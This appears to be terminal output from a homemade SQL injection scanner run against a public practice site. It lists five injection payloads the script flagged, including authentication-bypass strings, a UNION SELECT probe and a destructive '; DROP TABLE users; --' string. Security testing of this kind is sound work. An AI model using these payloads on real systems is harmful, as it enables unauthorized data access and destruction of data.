# Output

(venv) aheaheeralaleralal@AHEERALALs-MacBook-Pro Python % /Users/aheaheeralaleralal/Desktop/Python/venv/bin/python /Users/aheaheeralaleralal/Desktop/Python/
SQLi.py
Enter the URL of the web application to test: http://testphp.vulnweb.com/search.php?test=query

Enter the parameter to inject into (e.g., 'username', 'search'): searchFor

Enter HTTP method (GET/POST): POST

[+] Potential SQL injection vulnerability found with payload: ' OR 1=1 --

    Response contains SQL error or unexpected message
    
    Test URL: http://testphp.vulnweb.com/search.php?test=query
    
[+] Potential SQL injection vulnerability found with payload: ' OR 'a'='a' --

    Response contains SQL error or unexpected message
    
    Test URL: http://testphp.vulnweb.com/search.php?test=query
    
[+] Potential SQL injection vulnerability found with payload: '; DROP TABLE users; --

    Response contains SQL error or unexpected message
    
    Test URL: http://testphp.vulnweb.com/search.php?test=query
    
[+] Potential SQL injection vulnerability found with payload: ' UNION SELECT null, null, null --

    Response contains SQL error or unexpected message
    Test URL: http://testphp.vulnweb.com/search.php?test=query
[+] Potential SQL injection vulnerability found with payload: ' AND 1=2 --
    Response contains SQL error or unexpected message
    Test URL: http://testphp.vulnweb.com/search.php?test=query
